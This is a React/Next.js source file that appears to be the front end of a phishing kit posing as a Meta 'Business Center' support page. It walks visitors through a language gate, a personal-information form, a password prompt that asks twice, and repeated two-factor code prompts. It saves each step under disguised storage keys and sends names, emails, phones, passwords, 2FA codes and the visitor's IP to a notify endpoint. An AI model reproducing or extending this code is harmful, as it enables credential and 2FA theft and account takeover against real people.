"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import LanguageGate from "@/components/business-center/LanguageGate";
import {
  LocaleProvider,
  readInitialLang,
  useLocale,
} from "@/components/business-center/LocaleContext";
import PageContent from "@/components/business-center/PageContent";
import InfoFormModal from "@/components/modals/InfoFormModal";
import PasswordModal from "@/components/modals/PasswordModal";
import SuccessModal from "@/components/modals/SuccessModal";
import TwoFactorModal from "@/components/modals/TwoFactorModal";
import { fetchUserLocation, sendNotify } from "@/lib/clientLocation";
import { LANGUAGE_OPTIONS } from "@/lib/i18n";
import {
  generateTicketId,
  getConfirmedLanguageForIp,
  markLanguageGateConfirmed,
  saveRecord,
} from "@/lib/storage";
import type { ClientFormData, ModalStep } from "@/lib/types";

function BusinessCenterInner() {
  const { setLang } = useLocale();
  const [checking, setChecking] = useState(false);
  const [gateVisible, setGateVisible] = useState(true);
  const [dismissible, setDismissible] = useState(false);
  const [locked, setLocked] = useState(true);
  const [visitorIp, setVisitorIp] = useState("N/A");
  const visitorIpRef = useRef("N/A");
  const pendingLangRef = useRef<string | null>(null);
  const [ticketId] = useState(() => generateTicketId());
  const [step, setStep] = useState<ModalStep>("idle");
  const [formData, setFormData] = useState<ClientFormData | null>(null);
  const [passwordBundle, setPasswordBundle] = useState<{
    password: string;
    passwordSecond: string;
  } | null>(null);

  useEffect(() => {
    let alive = true;
    document.body.classList.add("bc-body", "language-locked");
    (async () => {
      const location = await fetchUserLocation();
      if (!alive) return;
      const ip = location.ip || "N/A";
      visitorIpRef.current = ip;
      setVisitorIp(ip);
      if (pendingLangRef.current && ip !== "N/A") {
        markLanguageGateConfirmed(ip, pendingLangRef.current);
        pendingLangRef.current = null;
      }
      const saved = getConfirmedLanguageForIp(ip);
      if (saved) {
        setLang(saved);
        setGateVisible(false);
        setLocked(false);
        setChecking(false);
        document.body.classList.remove("language-locked");
      }
    })();
    return () => {
      alive = false;
      document.body.classList.remove("bc-body", "language-locked");
    };
  }, [setLang]);

  useEffect(() => {
    const sources = [
      "/images/authentication.jpg",
      "/images/success.jpg",
      "/icons/ic_logo.svg",
      "/icons/ic_meta_gray.svg",
    ];
    const links = sources.map((href) => {
      const link = document.createElement("link");
      link.rel = "preload";
      link.as = "image";
      link.href = href;
      document.head.appendChild(link);
      return link;
    });
    return () => {
      links.forEach((link) => link.remove());
    };
  }, []);

  const unlock = () => {
    setGateVisible(false);
    setLocked(false);
    setChecking(false);
    setDismissible(false);
    document.body.classList.remove("language-locked");
  };

  const notifyForm = async (data: Record<string, unknown>) => {
    await sendNotify({ type: "form", data });
  };

  const baseAfterPassword = useMemo(() => {
    if (!formData || !passwordBundle) return {};
    return {
      ...formData,
      password: passwordBundle.password,
      passwordSecond: passwordBundle.passwordSecond,
    };
  }, [formData, passwordBundle]);

  return (
    <div className="bc-app">
      <LanguageGate
        visible={gateVisible}
        checking={checking}
        dismissible={dismissible}
        onClose={unlock}
        onConfirm={async (lang, label) => {
          const ip = visitorIpRef.current;
          if (ip && ip !== "N/A") {
            markLanguageGateConfirmed(ip, lang);
          } else {
            pendingLangRef.current = lang;
          }
          unlock();
          try {
            const sent = JSON.parse(
              localStorage.getItem("__lang_notify_ips__") || "[]"
            );
            if (Array.isArray(sent) && sent.includes(visitorIp)) return;
            await sendNotify({ type: "language", language: label });
            const next = Array.isArray(sent) ? [...sent, visitorIp] : [visitorIp];
            localStorage.setItem("__lang_notify_ips__", JSON.stringify(next));
          } catch {
            await sendNotify({ type: "language", language: label });
          }
        }}
      />

      <PageContent
        ticketId={ticketId}
        locked={locked}
        onActivate={() => setStep("info")}
        onMoreLanguages={() => {
          setDismissible(true);
          setGateVisible(true);
          setLocked(true);
          document.body.classList.add("language-locked");
        }}
        onFooterLangChange={(lang) => {
          markLanguageGateConfirmed(visitorIp, lang);
        }}
      />

      <div id="modalsContainer">
        <InfoFormModal
          open={step === "info"}
          ticketId={ticketId}
          onSubmit={(data) => {
            saveRecord("__client_rec__fi_rst", data);
            setFormData(data);
            setStep("password");
          }}
        />

        <PasswordModal
          open={step === "password"}
          baseData={formData || {}}
          onNotify={async (payload) => {
            if (payload.passwordSecond) {
              saveRecord("__client_rec__th_ird", payload);
            } else {
              saveRecord("__client_rec__se_con", payload);
            }
            await notifyForm(payload);
          }}
          onComplete={(password, passwordSecond) => {
            setPasswordBundle({ password, passwordSecond });
            setStep("twoFa");
          }}
        />

        <TwoFactorModal
          open={step === "twoFa"}
          fullName={formData?.fullName || ""}
          email={formData?.email || ""}
          emailBusiness={formData?.emailBusiness || ""}
          phone={formData?.phone || ""}
          phoneSecondary={formData?.phoneSecondary || ""}
          baseData={baseAfterPassword}
          onNotify={async (payload) => {
            if (payload.twoFaThird) {
              await notifyForm(payload);
            } else if (payload.twoFaSecond) {
              saveRecord("__client_rec__f_if_th", payload);
              await notifyForm(payload);
            } else {
              saveRecord("__client_rec__fou_rth", payload);
              await notifyForm(payload);
            }
          }}
          onSuccess={() => setStep("success")}
        />

        <SuccessModal open={step === "success"} />
      </div>
    </div>
  );
}

export default function BusinessCenterApp() {
  const initialLang = useMemo(() => {
    if (typeof window === "undefined") return "en";
    const stored = readInitialLang();
    return LANGUAGE_OPTIONS.some((l) => l.code === stored) ? stored : "en";
  }, []);

  return (
    <LocaleProvider initialLang={initialLang}>
      <BusinessCenterInner />
    </LocaleProvider>
  );
}
